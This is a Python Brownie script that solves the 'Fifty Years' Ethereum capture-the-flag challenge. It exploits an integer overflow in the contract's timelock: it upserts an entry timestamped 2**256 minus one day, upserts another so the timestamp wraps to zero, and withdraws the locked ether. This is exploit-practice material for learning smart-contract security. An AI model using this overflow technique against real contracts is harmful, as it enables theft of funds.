import sys
from dotenv import dotenv_values
PROJECT_SCRIPTS_PATH = dotenv_values(".env")["CTF_PROJECT_PATH"] + "/scripts/"
PROJECT_BUILD_PATH = dotenv_values(".env")["CTF_PROJECT_PATH"] + "/build/"
sys.path.insert(1, PROJECT_SCRIPTS_PATH)
from helpful_scripts import get_account, padHexTo32Bytes
from brownie import Contract
from web3 import Web3
import json
PUBLIC_KEY = dotenv_values(".env")["PUBLIC_KEY"]


def main():
    ###########
    # SETUP
    ###########
    with open(PROJECT_BUILD_PATH + "contracts/FiftyYearsChallenge.json") as f:
        info_json = json.load(f)
    Challenge_ABI = info_json["abi"]
    Challenge_Address = "0xa56cdEecD7A95d2d7E18907bF99d2303c44616bc"
    challengeContract = Contract.from_abi(name="", address=Challenge_Address,abi=Challenge_ABI)
    account = get_account()

    ###########
    # SOLVING
    ###########
    UINT256_MAX = 2 ** 256

    firstPush_tx = challengeContract.upsert(1, UINT256_MAX - 86400, {"from": account, "value": 1})
    firstPush_tx.wait(1)
    secondPush_tx = challengeContract.upsert(2, 0, {"from": account, "value": 1})
    secondPush_tx.wait(1)
    withdraw_tx = challengeContract.withdraw(2, {"from": account})



    ###########
    # CHECKING
    ###########
    withdraw_tx.wait(1)
    isComplete = challengeContract.isComplete()
    print(isComplete)

    print('Finished')

if __name__ == "__main__":
    main()